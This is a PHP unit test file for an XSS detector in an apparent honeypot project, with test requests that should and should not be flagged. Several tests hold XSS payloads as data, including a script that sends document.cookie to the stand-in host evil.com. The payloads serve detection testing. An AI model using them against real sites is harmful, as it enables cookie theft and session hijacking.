<?php

declare(strict_types=1);

namespace ReportedIp\Honeypot\Tests\Analyzers;

use ReportedIp\Honeypot\Detection\Analyzers\XssAnalyzer;
use ReportedIp\Honeypot\Tests\TestCase;

final class XssAnalyzerTest extends TestCase
{
    private XssAnalyzer $analyzer;

    public function setUp(): void
    {
        $this->analyzer = new XssAnalyzer();
    }

    public function testGetName(): void
    {
        $this->t->assertEquals('XSS', $this->analyzer->getName());
    }

    // --- Positive tests ---

    public function testDetectsScriptTag(): void
    {
        $request = $this->createRequest(['uri' => '/search?q=<script>alert(1)</script>']);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
        $this->t->assertGreaterThanOrEqual(80, $result->getScore());
    }

    public function testDetectsEventHandler(): void
    {
        $request = $this->createRequest(['uri' => '/page?name="><img src=x onerror=alert(1)>']);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsJavascriptProtocol(): void
    {
        $request = $this->createRequest(['uri' => '/page?url=javascript:alert(document.cookie)']);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsSvgXss(): void
    {
        $request = $this->createRequest(['uri' => '/page?input=<svg onload=alert(1)>']);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsIframeInjection(): void
    {
        $request = $this->createRequest(['uri' => '/page?data=<iframe src="http://evil.com">']);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsEncodedXss(): void
    {
        $request = $this->createRequest(['uri' => '/page?q=%3Cscript%3Ealert(1)%3C/script%3E']);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsPostDataXss(): void
    {
        $request = $this->createRequest([
            'uri'      => '/comment',
            'method'   => 'POST',
            'postData' => ['comment' => '<script>document.location="http://evil.com?c="+document.cookie</script>'],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    public function testDetectsEvalXss(): void
    {
        $request = $this->createRequest([
            'uri'        => '/page',
            'queryParams' => ['input' => 'eval("alert(1)")'],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
    }

    // --- Negative tests ---

    public function testIgnoresNormalHtml(): void
    {
        $request = $this->createRequest(['uri' => '/page?title=Hello+World']);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNull($result);
    }

    public function testIgnoresNormalSearch(): void
    {
        $request = $this->createRequest(['uri' => '/search?q=best+restaurants+near+me']);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNull($result);
    }

    public function testIgnoresCleanPost(): void
    {
        $request = $this->createRequest([
            'uri'      => '/form',
            'method'   => 'POST',
            'postData' => ['name' => 'Jane', 'email' => 'jane@example.com'],
        ]);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNull($result);
    }

    public function testCategoriesAre44And45(): void
    {
        $request = $this->createRequest(['uri' => '/page?q=<script>alert(1)</script>']);
        $result = $this->analyzer->analyze($request);
        $this->t->assertNotNull($result);
        $categories = $result->getCategories();
        $this->t->assertTrue(in_array(44, $categories, true), 'Should include category 44');
        $this->t->assertTrue(in_array(45, $categories, true), 'Should include category 45');
    }
}
